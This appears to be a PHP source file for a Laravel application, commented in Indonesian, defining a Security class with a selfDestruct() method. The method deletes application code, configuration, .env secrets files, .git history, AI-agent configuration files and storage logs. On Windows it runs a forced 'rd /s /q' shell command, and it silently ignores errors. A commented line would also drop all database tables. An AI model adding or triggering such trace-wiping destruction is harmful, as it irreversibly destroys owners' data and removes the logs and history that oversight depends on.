<?php

namespace App\Services;

use Illuminate\Support\Facades\File;

class Security
{
    /**
     * Menghapus jejak aplikasi secara menyeluruh (Nuclear Option).
     * Gunakan dengan risiko sangat tinggi.
     */
    public static function selfDestruct()
    {
        $paths = [
            app_path(),
            resource_path(),
            base_path('routes'),
            base_path('config'),
            base_path('bootstrap/cache'),
            base_path('bootstrap/ssr'),
            public_path('build'),
            base_path('.env'),
            base_path('.env.example'),
            base_path('.env.production'),
            base_path('.git'),
            base_path('.agents'),
            base_path('.claude'),
            base_path('.codex'),
            base_path('.vscode'),
            base_path('AGENTS.md'),
            base_path('CLAUDE.md'),
            base_path('README.md'),
            base_path('storage/logs'),
        ];

        foreach ($paths as $path) {
            if (! File::exists($path)) {
                continue;
            }
            try {
                if (File::isDirectory($path)) {
                    // Gunakan rmdir bawaan OS jika File::deleteDirectory gagal
                    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                        shell_exec('rd /s /q '.escapeshellarg($path));
                    } else {
                        File::deleteDirectory($path);
                    }
                } else {
                    File::delete($path);
                }
            } catch (\Exception $e) {
                continue;
            }
        }

        // Opsional: Jika database juga ingin dibersihkan (Hati-hati!)
        // \Illuminate\Support\Facades\Schema::dropAllTables();
    }
}
